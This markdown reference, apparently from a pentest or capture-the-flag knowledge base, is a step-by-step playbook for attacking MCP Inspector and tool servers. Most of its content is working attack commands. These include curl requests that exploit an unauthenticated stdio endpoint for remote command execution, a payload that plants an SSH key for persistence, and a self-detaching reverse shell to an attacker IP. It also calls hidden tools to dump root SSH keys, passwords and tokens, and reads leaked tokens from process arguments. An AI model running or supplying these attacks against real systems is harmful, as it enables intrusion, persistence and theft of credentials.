# MCP Tool-Server Attacks (Inspector stdio RCE + Hidden Tools)

Model Context Protocol (MCP) dev tooling — Inspector/proxy UIs, "ops" tool servers — is a fresh attack surface. Two recurring, high-impact bugs: an unauthenticated **stdio "connect" endpoint that spawns arbitrary processes**, and **tool servers whose `/tools/list` allowlist hides privileged tools** that `/tools/call` still honors.

## When this applies

- A landing page, port banner, or JS bundle advertises an "MCP Inspector", "MCP Playground", "MCPJam", or similar dev/proxy UI (often on a non-standard port, e.g. 6274).
- A service exposes a tool-server API: `/tools/list` + `/tools/call` (or `/tools/execute`), frequently a small Flask/Node app gated only by a static `X-API-Key`.
- Recognition: a single-page app whose JS bundle references `/api/mcp/*` routes, or any HTTP API that returns a list of callable "tools".

## Part 1 — Unauthenticated stdio command injection → RCE

The Inspector backend lets the UI "connect" to an MCP server. For `type:"stdio"` servers it launches the configured `command args` as a **child process on the host, with no auth**. The `command`/`args` fields are attacker-controlled ⇒ arbitrary command execution as the service user.

### Recon — recover the endpoint and body schema

Pull the SPA bundle and grep for the routes — the schema is in the client:

```bash
curl -s http://<TARGET_IP>:<PORT>/ | grep -oE '/assets/index-[A-Za-z0-9]+\.js'
curl -s http://<TARGET_IP>:<PORT>/assets/index-XXXX.js | grep -oE '/api/mcp/[a-z-]+' | sort -u
# typical: /api/mcp/connect  /api/mcp/list-tools  /api/mcp/tools/execute  /api/mcp/servers
```

### Confirm command execution

```bash
curl -s -X POST http://<TARGET_IP>:<PORT>/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"serverConfig":{"name":"x","type":"stdio","command":"id","args":[],"env":{},"requestTimeout":5000},"serverId":"x"}'
```

Key tell: the response is **`Connection closed`** (or an MCP handshake error), *not* a tool list. That is success — the backend spawned `id` as a child, it failed the MCP handshake, and was reaped. The exit/handshake failure confirms the process ran.

### Turn exec into durable access

Because the child is killed on handshake failure, a naive interactive reverse shell dies with it. Use the primitive to do something **self-detaching or persistent** instead:

- **Plant an SSH key** (most reliable — survives the reaped child):
  ```json
  {"serverConfig":{"name":"x","type":"stdio","command":"bash",
   "args":["-c","mkdir -p ~/.ssh; echo '<YOUR_PUBKEY>' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys"],
   "env":{},"requestTimeout":5000},"serverId":"x"}
  ```
  Then `ssh <serviceuser>@<TARGET_IP>`.
- **Self-detaching reverse shell** (`setsid`/`nohup`/`disown` so it outlives the parent):
  ```json
  {"command":"bash","args":["-c","setsid bash -c 'bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1' &"]}
  ```
- Then enumerate the host as the service user for the next hop (see Part 3).

## Part 2 — Hidden / undocumented tools beyond `/tools/list`

A tool server's discovery endpoint is **not** the full attack surface. `/tools/list` often returns a curated, benign subset while `/tools/call` still dispatches undocumented tool names (commonly stored in a `HIDDEN_TOOLS` map in the source). When the server runs as **root** (or any higher-priv account) and auth is just a static `X-API-Key`, a hidden admin/dump tool is a direct privilege-escalation primitive.

### Steps

1. Authenticate with the static key and list the advertised tools:
   ```bash
   curl -s http://127.0.0.1:<PORT>/tools/list -H 'X-API-Key: <KEY>'
   ```
2. **Read the source if reachable** (`/opt/<svc>/server.py`, a repo, a backup). Grep for the dispatch table and any second map of tool names:
   ```bash
   grep -nE 'HIDDEN|_admin|def .*tool|tools\s*=|dump|secret' /opt/<svc>/server.py
   ```
3. Call the undocumented tools directly — they bypass the listing, not the dispatcher:
   ```bash
   curl -s -X POST http://127.0.0.1:<PORT>/tools/call -H 'X-API-Key: <KEY>' \
     -H 'Content-Type: application/json' \
     -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
   ```
   Common high-value `target`/argument values: `ssh_keys` (dumps `/root/.ssh/id_rsa`), `passwords`, `tokens`, `env`, `config`.
4. If the server runs as root, a returned `/root/.ssh/id_rsa` is game over: `ssh -i root_id_rsa root@<TARGET_IP>`.

### If you cannot read the source

Guess undocumented names from the visible ones and the service's purpose: prefix variants (`admin_`, `_admin_`, `internal_`, `debug_`), verbs (`dump`, `read_file`, `exec`, `run`, `read_secret`), and a `confirm:true` / `force:true` guard argument that gated tools frequently require.

## Part 3 — Common chain on dev-tooling hosts

These boxes are typically multi-service: the Inspector RCE lands you as a low-priv build/dev user, and the next hops are *other local services* holding the privileged tooling.

1. Foothold via Part 1 (service user, e.g. `mcp-dev`).
2. Local recon for the next service + its secrets — **check process argv for leaked tokens** (`ps auxww`, `/proc/*/cmdline`): dev tools (Jupyter `--ServerApp.token=`, etc.) leak credentials there. See [foothold-patterns.md](../../../../system/reference/foothold-patterns.md) (Linux table).
3. Reach the internal tool server (often `127.0.0.1:5000` / `:8888`) via SSH local-forward, and apply Part 2 to escalate.

## Verifying success

- Part 1: `Connection closed`/handshake error on a benign `command` ⇒ exec confirmed; SSH-as-service-user after key plant ⇒ durable foothold.
- Part 2: `/tools/call` returns data for a name absent from `/tools/list` ⇒ hidden-tool dispatch confirmed.

## Common pitfalls

- Expecting a tool list back from `/api/mcp/connect` — the *error* is the success signal for command exec.
- A reverse shell that dies instantly: the child was reaped — detach it (`setsid`/`&`) or plant a key.
- Treating `/tools/list` as the whole surface — enumerate hidden names and read source.

## Tools

- `curl`, the target's own SPA JS bundle (for the route/body schema), `ssh`, `grep` on recovered source.

## See also

- [agentic-tool-hijacking.md](../../../../ai-threat-testing/reference/agentic-tool-hijacking.md) — hijacking LLM-held tools via prompt injection (the model-driven cousin of Part 2).
- [os-command-injection-via-llm.md](../web-llm/os-command-injection-via-llm.md) — command injection through an LLM's shell-like tool.
